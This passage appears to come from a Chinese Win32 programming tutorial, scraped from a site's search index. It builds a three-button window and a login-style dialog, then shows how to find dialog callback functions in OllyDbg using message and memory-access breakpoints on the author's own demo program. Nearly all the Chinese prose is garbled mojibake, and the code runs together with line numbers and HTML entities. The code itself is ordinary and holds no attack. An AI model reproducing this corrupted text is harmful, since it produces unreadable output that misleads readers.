ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; CreateThreeButton(hWnd); //åˆ›å»ºä¸‰ä¸ªæŒ‰é’® ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; case(WM_COMMAND): &#123; switch (wParam) &#123; case 0x3E9: &#123; MessageBox(NULL, &quot;Find Me 1&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 1; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; case 0x3EA: &#123; MessageBox(NULL, &quot;Find Me 2&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 2; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; case 0x3EB: &#123; MessageBox(NULL, &quot;Find Me 3&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 3; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; &#125; case(WM_DESTROY): &#123; PostQuitMessage(0); return 0; &#125; &#125;&#125;void CreateThreeButton(HWND hwnd)&#123; CreateWindowExA( 0, &quot;button&quot;, &quot;Find Me 1&quot;, WS_CHILD|WS_VISIBLE|1, 10,10, 80,20, hwnd, (HMENU)0x3E9, NULL, NULL ); CreateWindowExA( 0, &quot;button&quot;, &quot;Find Me 2&quot;, WS_CHILD|WS_VISIBLE|1, 10,40, 80,20, hwnd, (HMENU)0x3EA, NULL, NULL ); CreateWindowExA( 0, &quot;button&quot;, &quot;Find Me 3&quot;, WS_CHILD|WS_VISIBLE|1, 10,70, 80,20, hwnd, (HMENU)0x3EB, NULL, NULL );&#125;å¦‚æœéªŒè¯ç¨‹åºçš„å›è°ƒåé¢å¤šåŠ é‚£å¥return DefWindowProc(hwnd, uMsg, wParam, lParam);12345678910111213141516171819202122232425262728293031323334353637383940414243LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; case(WM_COMMAND): &#123; switch (wParam) &#123; case 0x3E9: &#123; MessageBox(NULL, &quot;Find Me 1&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 1; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; case 0x3EA: &#123; MessageBox(NULL, &quot;Find Me 2&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 2; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; case 0x3EB: &#123; MessageBox(NULL, &quot;Find Me 3&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 3; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; &#125; case(WM_DESTROY): &#123; PostQuitMessage(0); return 0; &#125; &#125;+ return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125;ç¼–è¯‘å‡ºReleaseï¼Œæ‹–å…¥ODï¼Œç¡®å®è¦æœ‰ä¸¤æ®µDefWindowProc"},{"title":"å¯¹è¯æ¡†åŠå›è°ƒå‡½æ•°å®šä½","path":"/wiki/Windows_API/å¯¹è¯æ¡†åŠå›è°ƒå‡½æ•°å®šä½.html","content":"ç¬¬ä¸€ä¸ªå¯¹è¯æ¡†ç¨‹åº é€‰æ‹©é¡¹ç›®ï¼Œå³é”®ï¼Œæ·»åŠ -èµ„æºï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢äº†resource.hå’ŒMyFirstDialog.rcæ–‡ä»¶ é€‰æ‹©Dialogï¼Œç‚¹å‡»â€œæ–°å»ºâ€ åŒå‡»rcæ‰“å¼€èµ„æºæ–‡ä»¶ï¼Œé€‰æ‹©Diglogï¼Œè¿›å…¥åˆ°å¯è§†åŒ–çš„ç¼–è¾‘ç•Œé¢ åœ¨è¿™ä¸ªç•Œé¢ä¸­å¯ä»¥é€šè¿‡å¯è§†åŒ–çš„æ–¹å¼æ–°å¢ã€åˆ é™¤æ§ä»¶ï¼Œè°ƒæ•´æ§ä»¶å¸ƒå±€ï¼ˆé€‰ä¸­å¤šä¸ªæ§ä»¶ååœ¨ä¸Šæ–¹è¿›è¡Œç­‰å®½ï¼Œç­‰é«˜ï¼Œæ°´å¹³å¯¹é½ç­‰è®¾ç½®ï¼‰ï¼Œé€‰æ‹©æ§ä»¶å³é”®-å±æ€§ï¼Œå¯ä»¥è®¾ç½®è¯¥èµ„æºç›¸å…³å±æ€§ï¼Œæ¯”å¦‚IDå·ï¼Œæ˜¾ç¤ºçš„æ–‡å­—ã€‚ ä½¿ç”¨å¯è§†åŒ–æ–¹å¼åˆ›å»ºèµ„æºåï¼Œåœ¨ä¸Šé¢æ‹–æ‹‰çš„æ§ä»¶ï¼ŒVSä¼šä¸ºæ¯ä¸ªæ–°æ·»åŠ çš„æ§ä»¶åˆ†é…ä¸€ä¸ªä¸é‡å¤çš„IDï¼Œå½“ä¿å­˜åï¼Œideä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬æ”¹è¿™ä¸ª.hæ–‡ä»¶ã€‚ ä¸ºäº†ä»£ç å¯è¯»æ€§å’Œç»´æŠ¤æ€§ï¼Œå¯ä»¥ä¿®æ”¹æŒ‰é’®çš„IDä¸ºä¸€ä¸ªå…·æœ‰æè¿°æ€§çš„IDï¼Œå¦‚IDC_OKï¼Œä¿®æ”¹å–æ¶ˆæŒ‰é’®çš„IDä¸ºIDC_CANCELã€‚ä¿å­˜åï¼Œresource.hä¼šè‡ªåŠ¨å¯¹åº”çš„å®ã€‚ ä¿®æ”¹IDå·å‰ï¼Œresource.hçš„å†…å®¹ä¿®æ”¹IDå·ï¼Œä¿å­˜åï¼Œresource.hçš„å†…å®¹1234567891011121314151617//&#123;&#123;NO_DEPENDENCIES&#125;&#125;// Microsoft Visual C++ ç”Ÿæˆçš„åŒ…å«æ–‡ä»¶ã€‚// ä¾› MyFirstDialog.rc ä½¿ç”¨//#define IDD_DIALOG1 101// Next default values for new objects// #ifdef APSTUDIO_INVOKED#ifndef APSTUDIO_READONLY_SYMBOLS#define _APS_NEXT_RESOURCE_VALUE 103#define _APS_NEXT_COMMAND_VALUE 40001#define _APS_NEXT_CONTROL_VALUE 1003#define _APS_NEXT_SYMED_VALUE 101#endif#endif12345678910111213141516171819//&#123;&#123;NO_DEPENDENCIES&#125;&#125;// Microsoft Visual C++ ç”Ÿæˆçš„åŒ…å«æ–‡ä»¶ã€‚// ä¾› MyFirstDialog.rc ä½¿ç”¨//#define IDD_DIALOG1 101#define IDC_OK 1001#define IDC_CANCEL 1002// Next default values for new objects// #ifdef APSTUDIO_INVOKED#ifndef APSTUDIO_READONLY_SYMBOLS#define _APS_NEXT_RESOURCE_VALUE 103#define _APS_NEXT_COMMAND_VALUE 40001#define _APS_NEXT_CONTROL_VALUE 1003#define _APS_NEXT_SYMED_VALUE 101#endif#endif æ˜¾ç¤ºå‡ºå¯¹è¯æ¡† 123456INT_PTR DialogBox( HINSTANCE hInstance, // handle to module LPCTSTR lpTemplate, // dialog box template HWND hWndParent, // handle to owner window DLGPROC lpDialogFunc // dialog box procedure ); DialogBoxç¬¬äºŒä¸ªå‚æ•°ï¼Œå¯ä»¥ä¼ char*æˆ–æ•´æ•°å€¼ã€‚æ ¹æ®MSDNï¼Œå¦‚æœæ˜¯æ•´æ•°å€¼ï¼Œè¦ç”¨MAKEINTRESOURCEå®å°†èµ„æºçš„IDè½¬æ¢ä¸ºèµ„æºåç§°ï¼ŒIDD_DIALOG1æ˜¯èµ„æºæ–‡ä»¶ä¸­å®šä¹‰çš„å¯¹è¯æ¡†æ ‡è¯†ç¬¦ã€‚ 123456789101112131415161718192021222324252627282930#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG1), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; return FALSE;&#125; æ·»åŠ æ–‡æœ¬æ¡† ä»å·¥å…·ç®±ä¸­æ‹–å‡ºæƒ³åˆ°æ·»åŠ çš„èµ„æºï¼Œè¿™é‡Œæˆ‘ä»¬æ·»åŠ é™æ€æ–‡æœ¬æ¡†ï¼ˆStatic Textï¼‰å’Œç¼–è¾‘æ–‡æœ¬æ¡†ï¼ˆEdit Controlï¼‰ã€‚é™æ€æ–‡æœ¬æ¡†çš„IDå¯ä»¥ä¿®æ”¹ï¼Œä½†é€šå¸¸æ²¡å¿…è¦ï¼Œé™¤ééœ€è¦åœ¨ä»£ç ä¸­ç”¨åˆ°å®ƒä»¬ã€‚å…¶ä»–çš„èµ„æºä¸ºäº†ä»£ç å¯è¯»æ€§ä¹Ÿæ”¹ä¸‹IDã€‚ æƒ³è·å¾—æ–‡æœ¬æ¡†é‡Œçš„å­å…ƒç´ ï¼Œå…ˆç”¨GetDlgItemè·å–å¯¹è¯æ¡†ä¸­æŒ‡å®šæ§ä»¶çš„å¥æŸ„ã€‚ æŒ‡æ˜æ˜¯å“ªä¸ªå¯¹è¯æ¡†çš„å“ªä¸ªèµ„æº1234HWND GetDlgItem( [in, optional] HWND hDlg, //å¯¹è¯æ¡†çš„å¥æŸ„ [in] int nIDDlgItem //èµ„æºID); 12345//1ã€è·å–æ–‡æœ¬æ¡†å¥æŸ„hEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME);//2ã€é€šè¿‡å¥æŸ„å¾—åˆ°é‡Œé¢çš„å†…å®¹TCHAR szUserBuff[0x50];GetWindowText(hEditUser, szUserBuff, 0x50); ä¸ä¹‹å‰çª—å£ç¨‹åºçš„å›è°ƒå‡½æ•°ä¸åŒçš„æ˜¯ï¼Œåœ¨å¯¹è¯æ¡†å›è°ƒå‡½æ•°ä¸­ï¼š å¤„ç†è¿‡çš„æ¶ˆæ¯ï¼Œè¿”å›TRUE ä¸å¤„ç†çš„æ¶ˆæ¯ï¼Œè¿”å›FALSE ç»§ç»­å®Œå–„ä¸‹å›è°ƒå‡½æ•°çš„ä»£ç  å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG1), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; HWND hEditUser = NULL; HWND hEditPassword = NULL; switch (uMsg) &#123; case WM_INITDIALOG: //å¯¹è¯æ¡†åˆ›å»ºçš„äº‹ä»¶ï¼Œåƒä¹‹å‰å†™çª—å£ç¨‹åºæ—¶çš„WM_CREATE MessageBox(NULL, TEXT(&quot;WM_INITDIALOG&quot;), TEXT(&quot;INIT&quot;), MB_OK); return TRUE; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case ID_BUTTON_OK: //1ã€è·å–æ–‡æœ¬æ¡†å¥æŸ„ hEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME); hEditPassword = GetDlgItem(hwndDlg, IDC_EDIT_PASSWORD); //2ã€é€šè¿‡å¥æŸ„å¾—åˆ°é‡Œé¢çš„å†…å®¹ TCHAR szUserBuff[0x50]; //è¾“å‡ºç¼“å†²åŒº TCHAR szPasswordBuffer[0x50]; GetWindowText(hEditUser, szUserBuff, 0x50); GetWindowText(hEditPassword, szPasswordBuffer, 0x50); MessageBox(NULL, TEXT(&quot;OK&quot;), TEXT(&quot;OK&quot;), MB_OK); return TRUE; case ID_BUTTON_EXIT: MessageBox(NULL, TEXT(&quot;EXIT&quot;), TEXT(&quot;EXIT&quot;), MB_OK); EndDialog(hwndDlg, 0); //å…³é—­å¯¹è¯æ¡† return TRUE; &#125; break; &#125; return FALSE;&#125; è¿è¡Œåï¼Œä¸‹æ–­ï¼Œè´¦å·é‚£ä¸ªç¼–è¾‘æ¡†è¾“å…¥1ï¼Œå¯†ç é‚£ä¸ªç¼–è¾‘æ¡†è¾“å…¥2ï¼Œç‚¹æŒ‰é’®â€œç¡®å®šâ€åæ–­ä¸‹ï¼Œå•æ­¥ï¼Œç„¶åçœ‹åˆ°szUserBufferè¢«èµ‹å€¼æˆå­—ç¬¦1ï¼ˆANSIç å¯¹åº”31ï¼‰ï¼ŒszPasswordBufferè¢«èµ‹å€¼æˆå­—ç¬¦2ï¼ˆANSIç å¯¹åº”32ï¼‰ã€‚ å¯¹è¯æ¡†VSçª—å£ ä¹‹å‰æˆ‘ä»¬è®²è¿‡åˆ›å»ºä¸€ä¸ªçª—å£ç¨‹åºçš„æ­¥éª¤ï¼š å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ï¼ˆä¸ºWndClassæˆå‘˜èµ‹å€¼ï¼Œæ³¨å†Œçª—å£ï¼‰ åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ï¼ˆCreateWindowï¼‰ æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç†ï¼ˆæ¶ˆæ¯å¾ªç¯ï¼‰ è€Œå¯¹è¯æ¡†åªéœ€è¦ï¼š æä¾›æ¶ˆæ¯å¤„ç†å‡½æ•° ç”¨DiglogBoxæ˜¾ç¤ºçª—å£ åˆ›å»ºå¯¹è¯æ¡†å¾ˆçœäº‹ã€‚å®é™…ä¸Šå¯¹è¯æ¡†ä¹Ÿæ˜¯çª—å£ï¼Œä¹Ÿéœ€è¦åšä¸Šé¢æçš„åˆ›å»ºçª—å£çš„1ã€2ã€3æ­¥éª¤ï¼Œåªæ˜¯çœçš„äº‹ç”±ç³»ç»Ÿå¸®å¼€å‘è€…åšäº†ï¼Œæ‰€ä»¥å¼€å‘è€…çœäº‹äº†ï¼Œä½†å®é™…ä¸Šè¦åšçš„äº‹æ˜¯ä¸€æ ·çš„ã€‚ å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•°å®šä½ ä¹‹å‰çª—å£ç¨‹åºæ˜¯é€šè¿‡wndClass.lpfnWndProcæ‰¾åˆ°çª—å£çš„å›è°ƒå‡½æ•°ã€‚è€Œå¯¹äºå¯¹è¯æ¡†ï¼Œç¨‹åºæ˜¯ä½¿ç”¨DiglogBoxè¿™ä¸ªAPIæ¥æ˜¾ç¤ºã€‚è¿™ä¸ªAPIæ˜¯ä»ç»™å¤–éƒ¨dllå¯¼å…¥çš„ï¼ˆæ¶‰åŠIATè¡¨çŸ¥è¯†ï¼‰ã€‚åœ¨ODä¸­ï¼ŒODèƒ½è¯†åˆ«å‡ºè¿™ä¸ªapiï¼Œæ¶ˆæ¯å¤„ç†å‡½æ•°å°±åœ¨å‚æ•°ä¸­ï¼Œå°±ç›´æ¥æ‰¾åˆ°äº†ã€‚ ä¸Šé¢çš„ç¤ºä¾‹exeæœ¬èº«çš„ä»£ç é€»è¾‘ç®€å•ï¼Œå®¹æ˜“æ‰¾åˆ°DiglogBoxã€‚è€Œå¦‚æœé¢å¯¹çš„æ˜¯ä¸€ä¸ªå¯¹è¯æ¡†éå¸¸å¤šï¼Œé€»è¾‘å¤æ‚çš„ç¨‹åºæ—¶ï¼Œä¼šå¾ˆéš¾æ‰¾åˆ°ä½ è¦æ‰¾çš„å¯¹è¯æ¡†çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ã€‚æ­¤æ—¶ï¼Œå¯ä»¥å€ŸåŠ©æ¶ˆæ¯æ–­ç‚¹æ¥å¸®åŠ©æˆ‘ä»¬æ¥æ‰¾ã€‚ è®©ç¨‹åºè·‘èµ·æ¥ï¼Œçª—å£è¢«åˆ›å»ºå‡ºæ¥åï¼Œç‚¹å‡»â€œWâ€æŒ‰é’®ï¼Œåˆ·æ–°ï¼Œæ˜¾ç¤ºå‡ºç›¸å…³çš„çª—å£å¥æŸ„ã€‚çœ‹åˆ°äº†ä¸‰ä¸ªButtonï¼ŒClsProcå¯¹åº”çš„å°±æ˜¯è¿™ä¸ªæŒ‰é’®çš„å›è°ƒå‡½æ•°ï¼Œåœ°å€æ˜¯7å¼€å¤´ã€‚ï¼ˆä¸æ˜¯è‡ªå·±ç”¨WndClassè‡ªå®šä¹‰çš„çª—å£ï¼Œè€Œæ˜¯ä½¿ç”¨ç³»ç»Ÿé¢„å…ˆå®šä¹‰å¥½çš„æ§ä»¶ï¼Œé‚£è¿™äº›æ§ä»¶çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ä¹Ÿæ˜¯ç³»ç»Ÿæä¾›çš„ï¼Œé«˜åœ°å€å¼€å¤´ï¼‰ã€‚ é€‰æ‹©â€œFind Me 1â€é‚£ä¸€æ¡ï¼Œå³é”®ï¼Œâ€œåœ¨ClsProcä¸Šåˆ›å»ºæ¶ˆæ¯æ–­ç‚¹â€ã€‚åœ¨æ¶ˆæ¯ä¸‹æ‹‰æ¡†é€‰æ‹©æ¶ˆæ¯çš„ç±»å‹ã€‚æ¶ˆæ¯çš„ç±»å‹é€‰æ‹©åŸå§‹çš„æ¶ˆæ¯ç±»å‹ï¼ˆæœªç»æ“ä½œç³»ç»Ÿå¤„ç†è¿‡çš„ï¼Œåœ¨Buttonä¸Šä»€ä¹ˆæ“ä½œå°±æ˜¯ä»€ä¹ˆæ¶ˆæ¯ç±»å‹ï¼‰ã€‚åœ¨æˆ‘ä»¬è¿™ä¸ªä¾‹å­ä¸­ï¼Œé¼ æ ‡æ¾å¼€ä¼šå¼¹çª—ï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©202 WM_LBUTTONDOWNã€‚ tipsï¼š201 WM_LBUTTONDOWNæ˜¯é¼ æ ‡æŒ‰ä¸‹æŒ‰é’®ï¼Œ202 WM_LBUTTONUPæ˜¯é¼ æ ‡æŒ‰ä¸‹æŒ‰é’®åæ¾å¼€çš„æ“ä½œã€‚ å¦‚æœä¸æ¸…æ¥šæ˜¯é¼ æ ‡æŒ‰ä¸‹è¿˜æ˜¯é¼ æ ‡æ¾å¼€è§¦å‘äº†æ¶ˆæ¯ï¼Œå¯ä»¥åœ¨ç¨‹åºä¸Šè¿›è¡Œæµ‹è¯•ï¼ˆODæ­¤æ—¶æ²¡åšä»»ä½•æ“ä½œï¼‰ï¼Œä¹Ÿå°±æ˜¯ç‚¹ç‚¹ç‚¹ï¼Œè¯•ä¸€ä¸‹ã€‚é¼ æ ‡æŒ‰ä¸‹â€œFind Me 1â€æŒ‰é’®æŒ‰ä½è€Œä¸æ¾å¼€ï¼Œè¿‡ä¸€ä¼šæ‰æ¾å¼€ã€‚ å¦‚æœä¸æ¾å¼€æ—¶ï¼Œçª—å£æœ‰è¡Œä¸ºï¼Œè¯´æ˜æ˜¯é¼ æ ‡æŒ‰ä¸‹è§¦å‘äº†æ¶ˆæ¯ï¼Œå¯¹åº”201 å¦‚æœæ¾å¼€åï¼Œçª—å£æœ‰è¡Œä¸ºï¼Œè¯´æ˜æ˜¯é¼ æ ‡æ¾å¼€è§¦å‘äº†æ¶ˆæ¯ï¼Œå¯¹åº”202 æ·»åŠ 202çš„æ¶ˆæ¯æ–­ç‚¹åï¼Œçœ‹åˆ°ä¸‰ä¸ªéƒ½å˜è‰²äº†ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ˜¯Buttonç±»ï¼Œç³»ç»Ÿä¸ºå®ƒä»¬æä¾›çš„ç³»ç»Ÿçº§æ¶ˆæ¯å¤„ç†å‡½æ•°éƒ½æ˜¯åŒä¸€ä¸ªã€‚ æ¶ˆæ¯æ–­ç‚¹çš„æœ¬è´¨è¿™æ—¶åˆ‡æ¢åˆ°â€œBâ€æ–­ç‚¹è§†å›¾ï¼Œå¯¹æ–­ç‚¹ï¼Œå³é”®ï¼Œç¼–è¾‘è§†å›¾ï¼Œå¯ä»¥å¾—çŸ¥ï¼šæ¶ˆæ¯æ–­ç‚¹çš„æœ¬è´¨å°±æ˜¯æ¡ä»¶æ–­ç‚¹ã€‚åˆšæ‰æ·»åŠ æ¶ˆæ¯æ–­ç‚¹çš„æ“ä½œåï¼Œå°±æ˜¯ç”±ODè‡ªåŠ¨å¸®æˆ‘ä»¬åœ¨é‚£ä¸ªç³»ç»Ÿå›è°ƒå‡½æ•°åœ°å€å¤„åŠ äº†F2æ–­ç‚¹+æ¡ä»¶æ–­ç‚¹ã€‚ é¼ æ ‡æŒ‰ä¸‹å¯¹è¯æ¡†ä¸Šçš„â€œFind Me 1â€æŒ‰é’®å¹¶æ¾å¼€ï¼ŒODæ–­ä¸‹ã€‚ ç‚¹å‡»â€œMâ€æŒ‰é’®ï¼Œè¿›å…¥å†…å­˜è§†å›¾ï¼Œåœ¨PEæ–‡ä»¶çš„.textä»£ç æ®µä¸Šå³é”®ï¼Œä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ã€‚å¦‚æ­¤ï¼Œæœ‰è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´è¿™æ®µä»£ç æ—¶å°±ä¼šæ–­ä¸‹ã€‚ F9è·‘èµ·æ¥ã€‚æ–­åœ¨äº†3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼ˆåŸå§‹æ¶ˆæ¯ç»ç”±ç³»ç»Ÿå›è°ƒå‡½æ•°å¤„ç†åï¼Œä¼šè°ƒç”¨ç”¨æˆ·ç¼–å†™çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ã€‚æˆ‘ä»¬åˆšåœ¨PEçš„ä»£ç æ®µä¸‹äº†å†…å­˜è®¿é—®æ–­ä¸‹ï¼Œæ‰€ä»¥åªè¦ç¨‹åºä¸€è®¿é—®3ç¯çš„ä»£ç å°±ä¼šè¢«æ–­ä¸‹ï¼‰ã€‚ è¿™é‡Œæœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œé€šè¿‡å †æ ˆæˆ‘ä»¬çœ‹åˆ°æ­¤æ—¶å‘ç»™ç”¨æˆ·çº§æ¶ˆæ¯å¤„ç†å‡½æ•°çš„æ¶ˆæ¯ç±»å‹å¯èƒ½ä¸æ˜¯è‡ªå·±æƒ³è¦çš„ã€‚æˆ‘ä»¬é¢„æœŸæ˜¯è¦ä¸€ä¸ªWM_COMMANDï¼Œ111çš„æ¶ˆæ¯ç±»å‹ã€‚ F8ï¼ŒF8ï¼Œå•æ­¥æ­¥å›ç³»ç»Ÿçš„æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼ˆæ­¤æ—¶å†…å­˜è®¿é—®æ–­ç‚¹è¿˜åœ¨ï¼Œåªèƒ½F8ï¼Œä¼šä¸€æ­¥ä¸€æ–­ï¼‰ã€‚ å›åˆ°ç³»ç»Ÿçš„æ¶ˆæ¯å¤„ç†å‡½æ•°åï¼ŒF9è·‘ï¼Œåˆä¼šå†æ¬¡æ–­åœ¨3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ã€‚è§‚å¯Ÿå †æ ˆçš„å‚æ•°ï¼Œæ˜¯æˆ‘ä»¬æƒ³è¦çš„æ¶ˆæ¯ç±»å‹ï¼ŒWM_COMMANDï¼Œ111ï¼Œæ­¤æ—¶å¯ä»¥å°†å†…å­˜è®¿é—®æ–­ç‚¹åˆ é™¤ï¼Œå¼€å§‹åˆ†æç¨‹åºçš„é€»è¾‘äº†ã€‚ æ¶ˆæ¯æ–­ç‚¹+å†…å­˜è®¿é—®æ–­ç‚¹æ‰¾3ç¯æ¶ˆæ¯å¤„ç†å‡½æ•°æ­¥éª¤å†æ¢³ç† åœ¨å­çª—å£çš„ç³»ç»Ÿå›è°ƒå‡½æ•°ä¸Šä¸‹æ¶ˆæ¯æ–­ç‚¹ï¼Œç”¨æˆ·ç‚¹å‡»å­çª—å£ï¼Œè®©ODæ–­åœ¨ç³»ç»Ÿæ¶ˆæ¯å¤„ç†å‡½æ•° åˆ‡æ¢åˆ°â€œMâ€è§†å›¾ï¼Œåœ¨PEæ–‡ä»¶çš„ä»£ç æ®µä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ F9è·‘èµ·æ¥ï¼Œä¼šåœåœ¨3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•° é€šè¿‡å †æ ˆçœ‹åˆ°å¯èƒ½ä¸æ˜¯è‡ªå·±æƒ³è¦çš„æ¶ˆæ¯ç±»å‹ é‚£å°±F8ï¼ŒF8å•æ­¥æ­¥å›ç³»ç»Ÿçš„æ¶ˆæ¯å¤„ç†å‡½æ•° F9è·‘ï¼Œå†æ¬¡å›åˆ°3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼Œç›´è‡³æ˜¯è‡ªå·±æƒ³è¦çš„æ¶ˆæ¯ç±»å‹ ä¸Šé¢æ­¥éª¤çš„åŸç†ï¼š å­çª—å£æ¶ˆæ¯çš„å¤„ç†é€»è¾‘ ä½¿ç”¨windowsé¢„å®šä¹‰å¥½çš„æ§ä»¶ï¼Œæ¯”å¦‚æŒ‰é’®ï¼Œé‚£ä¹ˆå¯¹æŒ‰é’®ï¼ˆå­çª—å£ï¼‰çš„æ“ä½œäº§ç”Ÿçš„åŸå§‹æ¶ˆæ¯æ˜¯å…ˆç”±ç³»ç»Ÿçš„å›è°ƒå‡½æ•°å¤„ç†ï¼Œå¤„ç†åè½¬æ¢ä¸ºWM_COMMANDæ¶ˆæ¯ï¼Œå†ä¼ ç»™çˆ¶çª—å£çš„æ¶ˆæ¯å¤„ç†å‡½æ•°è¿›è¡Œå¤„ç†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·åœ¨3ç¯ç¼–å†™çš„æ¶ˆæ¯å¤„ç†å‡½æ•°æ˜¯ç»ç”±ç³»ç»ŸåŠ å·¥åçš„æ¶ˆæ¯ç±»å‹ã€‚ ç”±ä¸Šé¢å¯çŸ¥ï¼š 